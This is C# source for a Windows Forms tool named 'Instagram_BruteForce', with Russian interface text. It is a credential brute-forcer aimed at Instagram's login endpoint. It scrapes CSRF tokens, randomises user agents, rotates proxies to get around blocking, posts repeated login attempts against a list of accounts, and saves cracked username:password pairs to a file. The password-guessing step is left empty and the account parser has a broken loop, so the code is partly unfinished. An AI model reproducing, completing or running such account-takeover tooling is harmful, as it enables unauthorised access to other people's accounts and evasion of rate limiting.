using System;
using System.Collections.Generic;
using System.IO;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Threading;
using System.Text.RegularExpressions;

namespace Instagram_BruteForce
{
    public partial class Form1 : Form
    {
        List<Account> accounts = new List<Account>();
        Statistics statistics = new Statistics();
        List<string> proxies = new List<string>();
        object locker = new object();

        public CancellationTokenSource cts = new CancellationTokenSource();
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            Task update = new Task(UpdateInfo);
            update.Start();

            Task start = new Task(Start);
            start.Start();
        }
        void Start()
        {
            Task brute = Task.Run(() => Brute(cts.Token));
        }
        void Brute(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                Account account = accounts.Find(x => x.status == Status.IN_QUEU);
                if(account == null)
                {
                    LogAdd("Аккаунтов не осталось", Color.Green);
                    return;
                }
                account.status = Status.IN_PROCESS;
                HttpRequest request = new HttpRequest();
                request.KeepAlive = true;
                request.UserAgentRandomize();
                request.Cookies = new CookieStorage();

                statistics.passwordsCompleted = 0;
                statistics.bruteNow = account.login;

                ParseData:
                string response = string.Empty;
                try
                {
                    response = request.Get("https://www.instagram.com/accounts/login/").ToString();
                }
                catch
                {
                    request.Proxy = ProxyClient.Parse(ProxyType.HTTP, ChangeProxy());
                    goto ParseData;
                }

                string ajax = instagramAjax(response);
                string token = token = csrfToken(response);

                while (!cancellationToken.IsCancellationRequested)
                {
                    string password = "";
                    bool? result = Check(request, account, password, token, ajax);
                    if (result == null)
                    {
                        ChangeProxy:
                        request.Proxy = ProxyClient.Parse(ProxyType.HTTP, ChangeProxy());
                        response = string.Empty;
                        try
                        {
                            response = request.Get("https://www.instagram.com/accounts/login/").ToString();
                        }
                        catch
                        {
                            goto ChangeProxy;
                        }
                        ajax = instagramAjax(response);
                        token = csrfToken(response);
                        request.Cookies = new CookieStorage();
                    }
                    else if (result == true)
                    {
                        account.status = Status.GOOD;
                        statistics.left--;
                        statistics.completed++;
                        account.password = password;
                        lock (locker)
                        {
                            UnLoadAccount(account);
                        }
                        break;
                    }
                    statistics.passwordsCompleted++;
                }

            }
        }
        public bool? Check(HttpRequest request, Account account, string password, string token, string ajax)
        {
            request.AddHeader(HttpHeader.Accept, "*/*");
            request.AddHeader(HttpHeader.ContentType, "application/x-www-form-urlencoded");
            request.AddHeader(HttpHeader.Origin, "https://www.instagram.com");
            request.AddHeader(HttpHeader.Referer, "https://www.instagram.com/accounts/login/");
            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
            request.AddHeader("Accept-Language", "uk-UA,uk;q=0.9,ru;q=0.8,en-US;q=0.7,en;q=0.6");
            request.AddHeader("X-CSRFToken", token);
            request.AddHeader("X-Instagram-AJAX", ajax);
            request.AddHeader("X-Requested-With", "XMLHttpRequest");

            RequestParams requestParams = new RequestParams();
            requestParams["username"] = account.login;
            requestParams["password"] = password;
            requestParams["optIntoOneTap"] = false;
            string authResponse = string.Empty;
            try
            {
                authResponse = request.Post("https://www.instagram.com/accounts/login/ajax/", requestParams).ToString();
            }
            catch
            {
                return null;
            }
            AuthData json = JsonConvert.DeserializeObject<AuthData>(authResponse);
            if (json.authenticated)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        string ChangeProxy()
        {
            string proxy = proxies.First();
            proxies.Remove(proxy);
            return proxy;
        }
        public string csrfToken(string response)
        {
            string token = Regex.Match(response, @"""csrf_token"":""(\S*)"",""viewer").Groups[1].Value;
            return token;
        }
        public string instagramAjax(string response)
        {
            string ajax = Regex.Match(response, @"""rollout_hash"":""(\S*)"",""bundle_variant").Groups[1].Value;
            return ajax;
        }
        public void UpdateInfo()
        {
            while (true)
            {
                label1.Text = $"Сбручено аккаунтов: {statistics.completed}";
                label2.Text = $"Сейчас брутим: {statistics.bruteNow}";
                label3.Text = $"Паролей опробовано: {statistics.passwordsCompleted}";
                label5.Text = $"Осталось аккаунтов: {statistics.left}";
            }
        }
        private void Button1_Click(object sender, EventArgs e)
        {
            if(openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                accounts = ParseAccounts(openFileDialog1.FileName).ToList();
                LogAdd("Аккаунты загружены", Color.Green);
            }
        }
        public IEnumerable<Account> ParseAccounts(string path)
        {
            using (StreamReader sr = new StreamReader(path))
            {
                string l = "l";
                while ((l = sr.ReadLine()) != null || l != "")
                {
                    string[] data = l.Split(':');
                    if (data.Length < 2)
                    {
                        LogAdd("Данные аккаунтов разделены не ':'", Color.Red);
                        l = "l";
                    }
                    Account account = new Account(data[0], data[1]);
                    yield return account;
                }
            }
        }
        public void UnLoadAccount(Account account)
        {
            using (StreamWriter sw = new StreamWriter("bruted.txt", true))
            {
                sw.WriteLine($"{account.login}:{account.password}");
            }
        }
        public void LogAdd(string text, Color color)
        {
            string line = $"{DateTime.Now} {text} {Environment.NewLine}";
            logBox.AppendText(line);
            logBox.Select(logBox.TextLength - line.Length + 1, line.Length);
            logBox.SelectionColor = color;
        }
    }
}
